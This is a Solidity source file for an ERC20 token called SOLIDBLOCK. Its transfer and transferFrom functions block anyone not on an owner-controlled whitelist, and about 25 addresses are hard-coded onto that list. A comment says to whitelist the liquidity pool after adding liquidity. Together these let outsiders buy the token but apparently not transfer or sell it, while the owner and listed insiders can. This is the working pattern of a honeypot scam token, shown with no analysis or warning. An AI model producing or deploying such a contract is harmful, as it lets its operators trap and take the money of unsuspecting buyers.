// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("SOLIDBLOCK", "SOLID") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 2000000000 * 10 ** decimals());
        whiteList[0x3EFcF3E34484931D8974a3e344C05b308E162B3d]= true;
        whiteList[0x865E4401EeAE9780504c3a5C2a150fce9A29681D]=true;
        whiteList[0xe063660471F89df39418b704254A3616b5F95Ba3]=true;
        whiteList[0x9d8D88e4C285fE697C75e9e40193642fE6EDbC7c]=true;
        whiteList[0x9a9c34786EEe235Cf327E80C068d51DA0CeaF9ad]=true;
        whiteList[0x7bF3521b55a034Bee595C59d0Fba84eD5e9DA421]=true;
        whiteList[0xB103cE8943345F9Fc050535314C29d52c3f86138]=true;
        whiteList[0x897fC314C1346B9e8d5fC686900A46a1b750AF59]=true;
        whiteList[0x61cB155602d7d71E142313C2cc89878F113240b1]=true;
        whiteList[0x73F1D1eA82f82f41bF184783D2dBbBe95A2291A8]=true;
        whiteList[0x1D40b3171b1865E7B0357571C9D90553D1182e11]=true;
        whiteList[0xA89900656E42afF418343793AdFB9B645c7Fb95D]=true;
        whiteList[0xfC7774CcB36cd5b5Fd05C0076395f699fA3a447F]=true;
        whiteList[0x7F5f076c0bDa5FE368Dea3753F31410b503f872B]=true;
        whiteList[0x15175E8A4e8F5e1CdA08236777AE14ebA4be83C8]=true;
        whiteList[0x1F7369c4508d7BCf4bEC98CBf04ADF3f5EAf5aC7]=true;
        whiteList[0xc5cBc34997E6280E69cc2d8b16dDB32c21947dB8]=true;
        whiteList[0x165730dd94d5182a33edf33B205857B7dCF0C87F]=true;
        whiteList[0x85BBEf889874aBd953dc7AAe2a13A34709B452b3]=true;
        whiteList[0xA4250D1895B93349b6D6FfF644f077F3AE830c88]=true;
        whiteList[0x93F3826789a7b137E5f08a369E9F9A1f07E1C59F]=true;
        whiteList[0x87B97DfbC1D08E5f95B8ff1a0eB1CB34e96D4188]=true;
        whiteList[0xf88442FD4C549BBbb2e34f967f8705ab75Aa80d5]=true;
        whiteList[0x9c246993a112Cd413EA3614082dad1B6f6B73d3e]=true;
        whiteList[0x06A96dE7122b300209b32A5c0803073c6d3565FD]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}